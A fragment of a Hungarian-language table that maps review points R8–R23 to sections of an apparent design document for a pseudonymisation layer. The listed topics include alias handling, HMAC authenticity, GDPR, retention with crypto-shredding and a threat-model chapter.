| R8 — streaming feloldás pufferelése | §10.4 |
| R9 — típusos, rövid álnév + opcionális kontextus-hint | §5, D1 |
| R10 — névtér, HMAC-hitelesség, kitalált álnév | §5 |
| R11 — magyar toldalék-tűrő illesztés, ML-NER nélkül | §8 |
| R12 — latency-budget és fail-closed/fail-open mátrix | §15 |
| R13 — GDPR: pszeudonimizálás, nem anonimizálás | §1, §18 |
| R14 — feloldási scope-invariáns (tenant + conversation + résztvevő) | §10.5 |
| R15 — retention a meglévő modellekre kötve, crypto-shredding | §6 |
| R16 — terminológia: surrogate / álnév | §5 |
| R17 — csatolmányok (PDF, kép) explicit nem cél | §17 |
| R18 — nyers tárolás, transzformáció a határon | §12 |
| R19 — perzisztens mapping (retry, újranyitás) | §5 |
| R20 — valós modulnevek az architektúrában | §3 |
| R21 — fenyegetésmodell és maradékkockázat | §16 (új fejezet) |
| R22 — mérhető kritériumok, válaszminőség-mérés | §20 |
| R23 — vertikális MVP-vágás (M1–M4) | §19 |
